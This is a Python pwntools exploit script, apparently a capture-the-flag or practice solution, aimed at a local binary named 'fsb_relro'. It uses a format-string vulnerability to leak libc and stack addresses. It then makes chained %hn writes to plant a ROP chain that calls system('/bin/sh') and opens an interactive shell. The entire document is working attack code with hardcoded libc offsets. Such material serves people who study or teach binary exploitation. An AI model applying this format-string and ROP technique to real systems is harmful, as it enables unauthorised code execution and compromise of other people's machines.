from pwn import *

p = process('fsb_relro') #env = {'LD_PRELOAD':'./libc.so.6'}
#libc = ELF('libc.so.6')
#elf = ELF('fsb_inf')

def s_sub(a,b):
    if a<b:
       return 0x10000 + a - b 
    return a - b 

payload = ""
payload += "%78$p.%79$p.%72$p." 

pause()

p.recv()
p.sendline(payload)
p.recvuntil(".")
libc_start_main_ret = int(p.recvuntil(".",drop = True),16)
#print hex(libc_start_main_ret)
log.info("libc_start_main_ret addr: " + hex(libc_start_main_ret))
stack_addr = int(p.recvuntil(".",drop = True),16)
log.info("stack_addr addr: " + hex(stack_addr))

pause()

libc_base = libc_start_main_ret - 0x202e1
system_addr = libc_base + 0x3f480
printf_addr = libc_base + 0x4f190
sh_addr = libc_base + 0x1619b9
log.info("system_addr addr: " + hex(system_addr))
log.info("printf_addr addr: " + hex(printf_addr))
log.info("sh_addr addr: " + hex(sh_addr))

pr_addr = 0x400a03

n = 6 + 14
pattern = "%{}c%{}$hn"

payload = ""
### pop rdi; ret

payload += pattern.format(0x0a03,n)

### "/bin/sh\x00"

sh_low = sh_addr & 0xffff
sh_mid = (sh_addr >> 16) & 0xffff
sh_high = (sh_addr >> 32) & 0xffff

payload += pattern.format(s_sub(sh_low,0x0a03),n+1)
payload += pattern.format(s_sub(sh_mid,sh_low),n+2)
payload += pattern.format(s_sub(sh_high,sh_mid),n+3)

### system

system_low = system_addr & 0xffff
system_mid = (system_addr >> 16) & 0xffff
system_high = (system_addr >> 32) & 0xffff

payload += pattern.format(s_sub(system_low,sh_high),n+4)
payload += pattern.format(s_sub(system_mid,system_low),n+5)
payload += pattern.format(s_sub(system_high,system_mid),n+6)

###padding

payload = payload.ljust(112,"A") #7*16=112

# ret -->  pop rid; ret
payload += p64(stack_addr-0x28)

# rdi --> "/bin/sh\x00"
payload += p64(stack_addr-0x28+8)
payload += p64(stack_addr-0x28+10)
payload += p64(stack_addr-0x28+12)

# system
payload +=p64(stack_addr-0x28+16)
payload +=p64(stack_addr-0x28+18)
payload +=p64(stack_addr-0x28+20)

pause()

p.sendline(payload)

p.interactive()
